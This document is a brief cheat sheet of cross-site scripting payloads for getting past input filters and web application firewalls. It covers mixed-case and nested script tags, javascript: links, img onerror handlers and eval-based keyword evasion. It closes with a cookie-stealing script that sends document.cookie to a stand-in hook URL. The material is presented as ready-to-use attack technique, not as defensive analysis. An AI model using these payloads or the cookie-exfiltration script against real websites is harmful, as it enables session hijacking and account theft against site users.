# **XSS:**

- XSS attacks are mainly found on user input areas, where you place the script function and see if the application can process it.
- One way to avoid this is by filtering but there are a couple of ways to bypass such filters, or to bypass WAF detections. Below are some ways to bypass.
  - One way to bypass XSS filters is to use Uppercases and lowercases all together in your payload. **i.e:** `<ScRiPt>alert(1)</ScRiPt>`
  - Another way to bypass XSS filters is to place the `script` function withing a text. **i.e:** `hac<scr<script>ipt>alert(1)</scr</script>ipt>ker`
  - Another way to bypass XSS filters is to use JavaScript, there is a non-exhaustive list below are just afew of them.
  - with the `<a` tag one will be required to click the link to trigger it: `<a href='javascript:alert(1)'/>`
  - with the `<img` tag: `onerror: <img src='zzzz' onerror='alert(1)' />`
  - with the `<div` tag one will be required to hover on the link to trigger it: `<div href='javascript:alert(1)'/>`
  - When you find an XXS filter the alert word one can use JavaScript's `eval` and `String.fromCharCode()` function to get encode your payload.
    - [JavaScript eval String.fromCharCode encoder](https://eve.gd/2007/05/15/javascript-eval-string-fromcharcode-encoder/)
    - OR you can bypass the filter as below: `<script>eval("al"+"ert(1)")` where the plus should be url encoded which is `%2b`

  - A script to steal cookies:

    ```html
    <script>document.write('<img src="WEBSITE.hook-URL?c='+document.cookie+'" />')</script>
    ```

  - **Remember** to **always** url-encode the **`+`** sign or else your payload **won't work**.
